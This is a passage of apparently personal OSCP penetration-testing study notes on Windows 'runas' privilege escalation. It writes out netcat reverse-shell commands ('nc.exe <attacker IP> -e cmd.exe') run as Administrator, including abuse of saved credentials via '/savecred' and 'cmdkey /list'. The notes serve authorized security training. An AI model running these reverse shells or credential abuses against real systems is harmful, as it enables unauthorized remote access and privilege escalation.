**`runas`** command when you **already possess a set of valid credentials** (username and password) for another user account on the target system and want to execute a command or launch a shell under that user's security context.

```
cd C:\Windows\Tasks
```

Transfer [[Netcat.exe]] into this path

User : Administrator | Path : C:\Windows\Tasks\nc.exe | Port 139
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `runas /user:Administrator "C:\\\Windows\\\Tasks\\nc.exe ${KaliIP} 139 -e cmd.exe"`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

## 2. Switching to Domain Accounts

If the machine is joined to an Active Directory domain and you have obtained credentials for a Domain User or Domain Admin:

DOS

```
runas /user:DOMAIN\DomainAdmin "cmd.exe"
```

## 3. Passing Credentials Non-Interactively (`/savecred`)

Normally, `runas` prompts interactively for a password, which **fails in non-interactive reverse shells** (like netcat or webshells) because there is no interactive TTY to enter the password.

However, if a domain user or administrator previously saved their credentials on the system using the `/savecred` flag, you can execute commands as that user **without entering a password**:

DOS

```
runas /user:Administrator /savecred "C:\Windows\Tasks\nc.exe 192.168.45.X 4444 -e cmd.exe"
```

> **OSCP Note:** Always check `cmdkey /list` in your initial shell. If you see saved credentials stored on the target, you can immediately exploit them using `runas /savecred /user:<USERNAME> "payload.exe"`.